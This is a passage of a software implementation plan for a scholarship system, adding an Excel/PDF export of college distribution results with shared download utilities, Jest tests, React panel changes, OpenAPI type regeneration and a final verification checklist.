python3 -m pytest app/tests/test_college_distribution_export_endpoint.py -p no:cacheprovider --no-cov -v
```

Expected: **7 passed**.

- [ ] **Step 6: Lint and commit**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
uvx --from "black==26.3.1" black --check --line-length=120 backend/app
cd backend && flake8 app --select=B904,B014,F401 --max-line-length=120
git add backend/app/api/v1/endpoints/college_review/distribution.py backend/app/tests/test_college_distribution_export_endpoint.py
git commit -m "feat: add college distribution-results Excel/PDF export endpoint

Reads through the same loader as the JSON endpoint, so the export cannot
show a student the panel would not. Cross-college isolation is asserted by
parsing workbook rows."
```

---

### Task 7: Frontend — 系所 in the panel, 匯出 dropdown, OpenAPI types

**Files:**
- Create: `frontend/lib/utils/download.ts`
- Modify: `frontend/components/college-ranking-table.tsx:126-144` (remove the local copy, import the shared one)
- Modify: `frontend/lib/api/modules/college.ts`
- Modify: `frontend/components/college/distribution/DistributionResultPanel.tsx`
- Regenerate: `frontend/lib/api/generated/schema.d.ts`
- Test: `frontend/lib/api/modules/__tests__/college.test.ts`

**Interfaces:**
- Consumes: `GET /api/v1/college-review/distribution-results/export` (Task 6); `department` on each student (Task 2).
- Produces: `triggerBlobDownload({ blob, filename }): void` from `@/lib/utils/download`; `exportDistributionResults(params: { scholarshipTypeId: number; academicYear: number; semester?: string; format?: "xlsx" | "pdf" }): Promise<{ blob: Blob; filename: string }>`.

- [ ] **Step 1: Extract `triggerBlobDownload` to a shared util**

`DistributionResultPanel` cannot import it today — it is module-local to `college-ranking-table.tsx`. Create `frontend/lib/utils/download.ts`:

```typescript
/**
 * Trigger a browser download for a fetched binary export.
 *
 * Shared by the college ranking export/template handlers and the distribution
 * results export, which all receive { blob, filename } from the college API module.
 */
export function triggerBlobDownload({
  blob,
  filename,
}: {
  blob: Blob;
  filename: string;
}): void {
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}
```

Then in `frontend/components/college-ranking-table.tsx`, delete the local `triggerBlobDownload` function (lines 126-144, including its comment block) and add to the import block near line 83:

```typescript
import { triggerBlobDownload } from "@/lib/utils/download";
```

The two existing call sites (lines ~671, ~686) are unchanged.

- [ ] **Step 2: Write the failing API-module test**

Append to `frontend/lib/api/modules/__tests__/college.test.ts`, matching the existing `exportRankingExcel` test style in that file:

```typescript
describe("exportDistributionResults", () => {
  it("omits the format param for xlsx so the default URL is unchanged", async () => {
    const fetchMock = jest.fn().mockResolvedValue(
      new Response(new Blob(["x"]), {
        status: 200,
        headers: {
          "content-disposition":
            "attachment; filename*=UTF-8''114%E5%AD%B8%E5%B9%B4%E5%BA%A6.xlsx",
        },
      })
    );
    global.fetch = fetchMock as unknown as typeof fetch;

    await exportDistributionResults({
      scholarshipTypeId: 7,
      academicYear: 114,
      semester: "first",
    });

    const url = fetchMock.mock.calls[0][0] as string;
    expect(url).toContain("/api/v1/college-review/distribution-results/export");
    expect(url).toContain("scholarship_type_id=7");
    expect(url).toContain("academic_year=114");
    expect(url).toContain("semester=first");
    expect(url).not.toContain("format=");
  });

  it("appends format=pdf when pdf is requested", async () => {
    const fetchMock = jest.fn().mockResolvedValue(
      new Response(new Blob(["x"]), { status: 200, headers: {} })
    );
    global.fetch = fetchMock as unknown as typeof fetch;

    await exportDistributionResults({
      scholarshipTypeId: 7,
      academicYear: 114,
      format: "pdf",
    });

    expect(fetchMock.mock.calls[0][0]).toContain("format=pdf");
  });

  it("surfaces the backend error detail", async () => {
    global.fetch = jest.fn().mockResolvedValue(
      new Response(JSON.stringify({ detail: "分發結果尚未開放查看" }), { status: 403 })
    ) as unknown as typeof fetch;

    await expect(
      exportDistributionResults({ scholarshipTypeId: 7, academicYear: 114 })
    ).rejects.toThrow("分發結果尚未開放查看");
  });
});
```

Add `exportDistributionResults` to the file's existing import from `../college`.

- [ ] **Step 3: Run to verify it fails**

```bash
/home/howard/scholarship-system/frontend/node_modules/.bin/jest \
  /home/howard/scholarship-system/.claude/worktrees/college-distribution-results/frontend/lib/api/modules/__tests__/college.test.ts \
  --watchAll=false
```

Expected: FAIL — `exportDistributionResults is not a function`.

- [ ] **Step 4: Add `department` to the type and the export function**

In `frontend/lib/api/modules/college.ts`, add `department` to `DistributionStudent` (line ~54):

```typescript
export interface DistributionStudent {
  student_number: string;
  student_name: string;
  department: string;
  rank_position?: number;
  backup_position?: number;
}
```

Append next to `downloadRankingTemplate` (after line 787):

```typescript
/**
 * Download this college's 分發結果 as Excel (default) or PDF.
 *
 * Endpoint: GET /api/v1/college-review/distribution-results/export
 *   `format` is an OPTIONAL query param: "pdf" appends `?format=pdf`; the default
 *   "xlsx" is omitted entirely, so the xlsx request URL is unchanged.
 */
export async function exportDistributionResults(params: {
  scholarshipTypeId: number;
  academicYear: number;
  semester?: string;
  format?: "xlsx" | "pdf";
}): Promise<{ blob: Blob; filename: string }> {
  const format = params.format ?? "xlsx";
  const search = new URLSearchParams();
  search.set("scholarship_type_id", String(params.scholarshipTypeId));
  search.set("academic_year", String(params.academicYear));
  if (params.semester) search.set("semester", params.semester);
  if (format !== "xlsx") search.set("format", format);
  return _fetchBinaryExport(
    "/api/v1/college-review/distribution-results/export",
    search,
    `分發結果_${params.academicYear}.${format}`,
    "無法匯出分發結果"
  );
}
```

- [ ] **Step 5: Run to verify it passes**

```bash
/home/howard/scholarship-system/frontend/node_modules/.bin/jest \
  /home/howard/scholarship-system/.claude/worktrees/college-distribution-results/frontend/lib/api/modules/__tests__/college.test.ts \
  --watchAll=false
```

Expected: PASS.

- [ ] **Step 6: Show 系所 in the panel and add the 匯出 dropdown**

In `frontend/components/college/distribution/DistributionResultPanel.tsx`:

Replace the `Row` component (lines 121-129) so 系所 renders:

```tsx
function Row({
  order,
  name,
  id,
  department,
}: {
  order?: number;
  name: string;
  id: string;
  department: string;
}) {
  return (
    <li className="flex items-center gap-2 text-sm text-gray-700">
      {typeof order === "number" && <span className="tabular-nums text-gray-400">{order}.</span>}
      <span>{name}</span>
      <span className="text-xs text-gray-400">({id})</span>
      {department && <span className="text-xs text-gray-500">{department}</span>}
    </li>
  );
}
```

Pass `department` at all three call sites (lines 80, 86, 92):

```tsx
              <Row key={`a-${s.student_number}`} order={s.rank_position} name={s.student_name} id={s.student_number} department={s.department} />
```
```tsx
              <Row key={`b-${s.student_number}`} order={s.backup_position} name={s.student_name} id={s.student_number} department={s.department} />
```
```tsx
              <Row key={`r-${s.student_number}`} name={s.student_name} id={s.student_number} department={s.department} />
```

Add the imports:

```tsx
import { Loader2, Download, FileSpreadsheet, FileText } from "lucide-react";
import { toast } from "sonner";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Button } from "@/components/ui/button";
import { triggerBlobDownload } from "@/lib/utils/download";
```

Add the handler inside `DistributionResultPanel`, after the `useEffect`:

```tsx
  const [exporting, setExporting] = useState(false);

  const handleExport = async (format: "xlsx" | "pdf") => {
    if (typeof selectedAcademicYear !== "number") return;
    setExporting(true);
    try {
      const { exportDistributionResults } = await import("@/lib/api/modules/college");
      const result = await exportDistributionResults({
        scholarshipTypeId: scholarshipType.id,
        academicYear: selectedAcademicYear,
        semester: selectedSemester,
        format,
      });
      triggerBlobDownload(result);
      toast.success("匯出成功");
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "匯出失敗");
    } finally {
      setExporting(false);
    }
  };
```

Wrap the returned list in a header row carrying the dropdown — replace `return (<div className="space-y-6">` with:

```tsx
  return (
    <div className="space-y-6">
      <div className="flex justify-end">
        <DropdownMenu>
          <DropdownMenuTrigger asChild>
            <Button variant="outline" size="sm" disabled={exporting}>
              {exporting ? (
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              ) : (
                <Download className="mr-2 h-4 w-4" />
              )}
              匯出
            </Button>
          </DropdownMenuTrigger>
          <DropdownMenuContent align="end">
            <DropdownMenuItem onClick={() => handleExport("xlsx")}>
              <FileSpreadsheet className="mr-2 h-4 w-4" />
              匯出 Excel
            </DropdownMenuItem>
            <DropdownMenuItem onClick={() => handleExport("pdf")}>
              <FileText className="mr-2 h-4 w-4" />
              匯出 PDF
            </DropdownMenuItem>
          </DropdownMenuContent>
        </DropdownMenu>
      </div>
```

The dropdown sits inside the post-guard return, so it is absent on the 尚未分發 / error / loading paths — nothing to export there.

- [ ] **Step 7: Typecheck**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results/frontend
/home/howard/scholarship-system/frontend/node_modules/.bin/tsc --noEmit --skipLibCheck
```

Expected: no errors.

- [ ] **Step 8: Regenerate OpenAPI types from THIS worktree**

`npm run api:generate` hits `localhost:8000`, which serves a **different** worktree — it would generate the wrong schema. Dump the spec in-process instead:

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results/backend && \
env ENVIRONMENT=development \
  DATABASE_URL="postgresql+asyncpg://scholarship_user:scholarship_pass@localhost:5432/scholarship_db" \
  DATABASE_URL_SYNC="postgresql://scholarship_user:scholarship_pass@localhost:5432/scholarship_db" \
  SECRET_KEY="test_secret_key_at_least_32_chars_long_padding_xyz" \
  MINIO_ENDPOINT="localhost:9000" MINIO_ACCESS_KEY="minioadmin" MINIO_SECRET_KEY="minioadmin123" \
  MINIO_BUCKET="scholarship-documents" MINIO_SECURE=false \
  python3 -c "import json,sys; from app.main import app; sys.stdout.write(json.dumps(app.openapi()))" \
  > /tmp/claude-1001/-home-howard-scholarship-system/1ba60cef-2008-4947-a73d-6ba8bc982837/scratchpad/openapi.json

cd ../frontend && /home/howard/scholarship-system/frontend/node_modules/.bin/openapi-typescript \
  /tmp/claude-1001/-home-howard-scholarship-system/1ba60cef-2008-4947-a73d-6ba8bc982837/scratchpad/openapi.json \
  -o lib/api/generated/schema.d.ts
```

Verify the new route landed:

```bash
grep -c "distribution-results/export" lib/api/generated/schema.d.ts
```

Expected: `≥1`.

- [ ] **Step 9: Commit**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
git add frontend/lib/utils/download.ts frontend/components/college-ranking-table.tsx \
        frontend/lib/api/modules/college.ts frontend/lib/api/modules/__tests__/college.test.ts \
        frontend/components/college/distribution/DistributionResultPanel.tsx \
        frontend/lib/api/generated/schema.d.ts
git commit -m "feat: show 系所 and add Excel/PDF export to the college distribution panel

Extracts triggerBlobDownload into lib/utils/download so the panel and the
ranking table share one implementation."
```

---

### Task 8: Full verification

**Files:** none modified — this is the gate before review.

- [ ] **Step 1: Full backend unit lane**

```bash
# (env block)
python3 -m pytest app/tests -m "not integration and not asyncio" -p no:cacheprovider --no-cov -q
```

Expected: **3047 + 13 = 3060 passed**, 0 failed. (The 13 new sync tests from Task 5 land here.)

- [ ] **Step 2: Integration lane for the touched files**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py app/tests/test_college_distribution_export_endpoint.py \
  -p no:cacheprovider --no-cov -v
```

Expected: **19 passed** (12 + 7).

- [ ] **Step 3: Lint gate**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
uvx --from "black==26.3.1" black --check --line-length=120 backend/app
cd backend && flake8 app --select=B904,B014,F401 --max-line-length=120
```

Expected: all clean.

- [ ] **Step 4: Drive the real UI**

Do **not** claim this works on tests alone. Use the `verify` skill (or `playwright-test-and-debug`) to log in as a seeded college user, open 分發結果, confirm 學號/姓名/系所 render, and download both Excel and PDF. Confirm the PDF opens with legible Chinese (this is the step that catches a missing CJK font, which no unit test on the host will catch).

- [ ] **Step 5: Cross-college spot check against a real second college**

Log in as a **different** college's user and confirm the export contains none of the first college's students. This is the user's headline requirement — verify it against the running app, not only in pytest.

---

## Self-Review

**Spec coverage:**

| Spec requirement | Task |
|---|---|
| 系所 from `trm_depname` | 2 |
| Excel export | 5, 6 |
| PDF export | 5, 6 |
| No PII / no `pii_access` audit | 5 (columns), 6 (no audit block) |
| Gate chain incl. new grant checks | 4 |
| Ranking scoped by `college_code` | 4 |
| Dedup by `application_id` | 3 |
| ORDER BY + 名次 on 未錄取 + None-last sort | 3 |
| Loader in `_helpers.py`, not a service | 1 |
| `sanitize_excel_cell` on xlsx only | 5 |
| Zero-row export emits header | 5 |
| Frontend 系所 + 匯出 dropdown | 7 |
| OpenAPI regen from this worktree | 7 Step 8 |
| Fixture fixes (grants + `college_code`) | 4 Step 1 |
| Isolation proven on the export endpoint by parsing rows | 6 |

No gaps.

**Type consistency:** `load_college_distribution_results` (Tasks 1,2,3,4,6) — one signature throughout. `DistributionExportRow` field order `(sub_type_label, outcome, position, student_number, student_name, department)` matches `_row_cells` and the positional construction in Task 5's tests. `flatten_sub_types` reads `department`, which Task 2 produces. `triggerBlobDownload` — one definition (Task 7 Step 1), two callers. `exportDistributionResults` param object matches its test.

**Known ordering dependency:** Task 4 Step 1 (fixtures) MUST precede Task 4 Steps 4-5 (gates), or the four original tests fail for the wrong reason.
